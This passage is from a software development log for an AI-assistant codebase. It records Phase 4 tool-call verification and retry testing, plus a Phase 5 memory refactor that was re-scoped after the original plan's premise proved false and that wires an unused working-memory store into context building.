**Explicitly not done in Phase 4** (deferred, not overlooked): per-tool-specific verification (e.g. actually checking a calendar event exists after "creating" it, rather than just checking the API call's own reported error) — the generic convention-based check catches "the handler said it failed" but not "the handler said it succeeded while actually doing nothing"; verification in `mac_dispatcher.py`/`tool_calling.py`'s dispatch loops; any automatic rollback beyond the existing sandbox one.

**Verified**: full app boots with the same 46 routes as Phase 3 (no regression). Unit tests confirmed the offline-fallback string, dict/list/JSON-string error shapes, and the bracket-text convention are all detected correctly, that non-reversible tools never get `retry` recommended even for transient-looking errors, and that a real success never false-positives. Behavioral tests against `execute_step()` confirmed: a real success makes exactly one call; a transient error that resolves on the second attempt succeeds with an observed backoff delay; a persistently transient error stops at exactly 3 attempts and reports the real failure rather than fabricating success; a permanent error (allowlist rejection) never retries at all (one call); and the Phase 3 confirmation gate still fires before any handler or retry logic runs. Re-ran the full Phase 3 test suite (enforcement + gmail regression) against the Phase-4-modified `executor.py` — all still pass.

### Phase 5 — Memory unification (done, re-scoped — premise was wrong)

Reading `core/memory.py` in full (814 lines) before touching anything found the original plan's premise false: it does **not** mix working/episodic/semantic/procedural/emotional/prospective together. It already implements all six as cleanly separated, clearly-labeled sections, each with its own backing file (`_EPISODIC_FILE`, `_SEMANTIC_FILE`, `_PROCEDURAL_FILE`, `_EMOTIONAL_FILE`, `_PROSPECTIVE_FILE`) and its own store/recall functions, plus a `universal_recall()` that already searches across all of them together. `core/context.py::build_context()` already implements the master directive's "retrieve → rank → filter → inject" discipline too — a real token budget (`MAX_CONTEXT_TOKENS`), priority-ordered trimming per source, graceful per-source degradation. Splitting an already-well-organized file into multiple files would have been pure churn — the opposite of "prefer simple, testable designs" — so that specific plan item was dropped rather than forced through.

What genuinely was missing, found by the same read-it-in-full pass: `core/working_memory.py` — a real, well-built 7-item salience-ranked "active attention" store (Miller's Law capacity, least-important eviction, content-relevant `get_relevant(query)`) — was fully built but **completely disconnected**: zero callers of `.hold()` anywhere in the repo. This is the same "built but unwired" pattern the code's own comments already describe fixing once for episodic/semantic memory (see `episodes_as_context()`/`facts_as_context()`'s docstrings, "item C of the reasoning-quality investigation") — left unaddressed for working memory specifically. Confirmed the re-scope and the write-side design (population strategy is a real judgment call, not mechanical) with the user before implementing.

1. **Write path** (`core/memory.py::save_turn()`): after the existing fact-extraction call, holds each turn's (redacted) user message in working memory, keyed by timestamp, with importance from a cheap length-based heuristic — no LLM call, matching `working_memory.py`'s own "Free" design intent. Uses the exact same choke point the code's own comments already identify as correct for this ("the one choke point every real conversation turn already passes through exactly once").
2. **Read path**: new `working_memory_as_context()` in `core/memory.py`, mirroring `facts_as_context()`/`episodes_as_context()`'s exact pattern, wired into `build_context()`'s priority-ordered budget assembly — positioned right after short-term conversation history (it's about current-session active attention, not durable long-term knowledge) and assembled adjacent to short-term in the final string.
3. **Small fix found in passing**: `search_notes()` had a dead second `return` statement referencing undefined `clips`/`limit` variables — unreachable (harmless) leftover from a copy-paste of `get_clips()`. Removed.

**Explicitly not done in Phase 5** (deferred, not overlooked): no file splitting (the existing organization is already correct); no changes to episodic/semantic/procedural/emotional/prospective (already wired, or — for procedural/emotional/prospective — correctly left unwired since nothing writes to them, per the existing code's own comment); no session-boundary clearing of working memory (no session concept exists elsewhere in the codebase to hook it to; natural capacity-based eviction already bounds it).

**Verified**: full app boots with the same 46 routes as Phase 4 (no regression). Behavioral tests confirmed: `save_turn()` actually populates working memory; `working_memory_as_context()` retrieves content-relevant turns (not just recent ones) and correctly returns nothing for an unrelated query; capacity eviction holds at exactly 7 items after 10 turns. `build_context()` integration tests confirmed: empty working memory doesn't crash or add a stray section; a relevant working-memory entry actually appears in the assembled context; a near-zero token budget still doesn't crash (working memory correctly gets trimmed out first when there's no room). Re-ran the full Phase 3 and Phase 4 test suites against the Phase-5-modified files — all still pass.
